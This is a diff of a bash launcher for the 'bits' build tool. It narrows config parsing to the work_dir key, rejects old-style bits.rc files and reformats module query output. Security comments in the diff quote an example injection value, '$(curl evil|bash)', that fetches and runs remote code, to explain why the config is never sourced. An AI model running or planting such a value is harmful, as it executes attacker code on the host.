@@ -189,81 +189,78 @@ function stripDyld() {
 }
 
 function readBitsRc() {
-  # SECURITY: never source the config file or its derived content directly.
-  # Sourcing key=value pairs allows arbitrary shell-code injection via crafted
-  # config values (e.g.  work_dir = $(curl evil/pwn|bash)).
-  # Instead, extract each known key individually with awk and assign it to
-  # the corresponding variable using a whitelist case statement.
+  # SECURITY: never source the config file (a crafted value like
+  # work_dir = $(curl evil|bash) would execute). The launcher itself needs only
+  # the work directory for module operations; every other bits.rc setting
+  # (config_dir, architecture, defaults, organisation, providers, ...) is read
+  # by the Python layer in bits_helpers/args.py. Extract work_dir with awk —
+  # flat "work_dir = value" or a value inside a leading [bits] section both
+  # work; sw_dir is accepted as a deprecated alias.
   local cfgfile="$1"
   [[ -f "$cfgfile" ]] || return 0
-
-  # Read a single key from a given INI section.  awk stays in section mode
-  # between a [section] header and the next blank line or EOF.  Only the first
-  # occurrence of each key is returned (INI convention).
-  _rc_get() {
-    local section="$1" key="$2"
-    awk -v section="$section" -v key="$key" '
-      /^\[/ { in_section = ($0 == "[" section "]") }
-      in_section && /^[[:space:]]*[^#;]/ {
-        sub(/^[[:space:]]*/, ""); sub(/[[:space:]]*$/, "")
-        if (match($0, "^" key "[[:space:]]*=[[:space:]]*")) {
-          print substr($0, RLENGTH+1)
-          exit
-        }
-      }
-    ' "$cfgfile"
-  }
-
-  # Whitelist of recognised keys → shell variable names.
-  # Only these assignments are ever made; no arbitrary execution is possible.
-  local val
-  for mapping in \
-      "organisation:organisation" \
-      "branding:branding" \
-      "search_path:search_path" \
-      "repo_dir:repo_dir" \
-      "sw_dir:sw_dir" \
-      "pkg_prefix:pkg_prefix"
-  do
-    local key="${mapping%%:*}"
-    local var="${mapping##*:}"
-    val="$(_rc_get "bits" "$key")"
-    # Also check the organisation-specific section if organisation is known.
-    if [[ -z "$val" && -n "$organisation" ]]; then
-      val="$(_rc_get "$organisation" "$key")"
-    fi
-    [[ -n "$val" ]] && printf -v "$var" '%s' "$val" || true
-  done
+  work_dir="$(awk '
+    { line=$0; sub(/^[[:space:]]*/,"",line); sub(/[[:space:]]*$/,"",line)
+      if (line ~ /^(work_dir|sw_dir)[[:space:]]*=/) {
+        sub(/^(work_dir|sw_dir)[[:space:]]*=[[:space:]]*/,"",line)
+        print line; exit } }' "$cfgfile")"
   return 0
 }
 
+function checkLegacyBitsRc() {
+  # The bits.rc format was simplified. Reject old-style files loudly rather
+  # than silently ignoring renamed/removed keys. Old markers: the deprecated
+  # keys below, or any section other than [bits].
+  local cfgfile="$1"
+  [[ -f "$cfgfile" ]] || return 0
+  local bad
+  bad="$(awk '
+    /^[[:space:]]*\[/ {
+      if ($0 !~ /^[[:space:]]*\[bits\][[:space:]]*$/) { print "  section " $0 } ; next }
+    /^[[:space:]]*(repo_dir|sw_dir|search_path|pkg_prefix|branding)[[:space:]]*=/ {
+      k=$0; sub(/^[[:space:]]*/,"",k); sub(/[[:space:]]*=.*/,"",k); print "  key    " k }
+  ' "$cfgfile")"
+  [[ -z "$bad" ]] && return 0
+  {
+    echo "ERROR: $cfgfile uses the old bits.rc format. Offending entries:"
+    echo "$bad"
+    echo
+    echo "Please update it (keep a single [bits] section):"
+    echo "  repo_dir     -> config_dir"
+    echo "  sw_dir       -> work_dir"
+    echo "  search_path  -> removed; set BITS_PATH (e.g. export BITS_PATH=lcg) or use a provider"
+    echo "  pkg_prefix   -> removed; the display prefix comes from the aliBuild wrapper (BITS_PKG_PREFIX)"
+    echo "  branding     -> removed"
+    echo "Per-organisation [NAME] sections are no longer supported."
+    echo
+    echo "Example:"
+    echo "  [bits]"
+    echo "  organisation = stacks"
+    echo "  config_dir   = ."
+  } >&2
+  exit 1
+}
+
 function configBits() {
-
-  # Backward compatibility defaults
-
-  BITS_BRANDING=${BITS_BRANDING:-"bits"}
-  BITS_PATH=${BITS_PATH:-""}
-  BITS_REPO_DIR=${BITS_REPO_DIR:-"alidist"}
+  # Backward-compatibility default for the work directory. NOTE: the display
+  # prefix (BITS_PKG_PREFIX) and branding come from the ENVIRONMENT only — the
+  # aliBuild wrapper exports them for ALICE-style "VO_ALICE@pkg::ver" output;
+  # an empty BITS_PKG_PREFIX makes `bits q` print the native "<pkg>/<version>".
+  # organisation (registry/provider selection) and all other settings are
+  # handled by the Python layer, not here.
   BITS_WORK_DIR=${BITS_WORK_DIR:-"sw"}
-  BITS_ORGANISATION=${BITS_ORGANISATION:-"ALICE"}
-  BITS_PKG_PREFIX=${BITS_PKG_PREFIX:-"VO_"$BITS_ORGANISATION}
-    
-  cfile=""
 
+  cfile=""
   for cfg in "$1" bits.rc .bitsrc "$HOME/.bitsrc"
   do
     [[ -n "$cfg" && -f "$cfg" ]] && { cfile="$cfg"; break; }
   done
 
+  local work_dir=
+  [[ -n "$cfile" ]] && checkLegacyBitsRc "$cfile"
   [[ -n "$cfile" ]] && readBitsRc "$cfile"
-    
-  export BITS_ORGANISATION=${organisation:-$BITS_ORGANISATION}
-  export BITS_BRANDING=${branding:-$BITS_BRANDING}
-  export BITS_PATH=${search_path:-$BITS_PATH}
-  export BITS_REPO_DIR=${repo_dir:-$BITS_REPO_DIR}
-  export BITS_WORK_DIR=${sw_dir:-$BITS_WORK_DIR}
-  export BITS_PKG_PREFIX=${pkg_prefix:-$BITS_PKG_PREFIX}
 
+  export BITS_WORK_DIR=${work_dir:-$BITS_WORK_DIR}
+  export BITS_PKG_PREFIX=${BITS_PKG_PREFIX:-}
 }
 
 config_file=""
@@ -537,9 +534,17 @@ case "$ACTION" in
   q|query)
     [[ -z "${ARGS[0]}" ]] && SEARCH_CMD=cat || SEARCH_CMD=( grep -iE "${ARGS[0]}" )
     collectModules
+    # Native module names are <pkg>/<version>. With a display prefix set (e.g.
+    # via the aliBuild wrapper) reformat to <PREFIX>@<pkg>::<version>; with no
+    # prefix, pass the native form through unchanged.
+    if [[ -n "$BITS_PKG_PREFIX" ]]; then
+      _fmt=( sed -e 's!^\([^/]*\)/\(.*\)$!'"${BITS_PKG_PREFIX}"'@\1::\2!' )
+    else
+      _fmt=( cat )
+    fi
     $MODULECMD bash -t avail 2>&1 | grep -E '^[^/]+/[^/]+$' | grep -vE ':$' | \
-      "${SEARCH_CMD[@]}" | sed -e 's!^\([^/]*\)/\(.*\)$!'${BITS_PKG_PREFIX}'@\1::\2!'
-    exit ${PIPESTATUS[3]}  # grep
+      "${SEARCH_CMD[@]}" | "${_fmt[@]}"
+    exit ${PIPESTATUS[3]}  # SEARCH grep
   ;;
   avail)
     collectModules
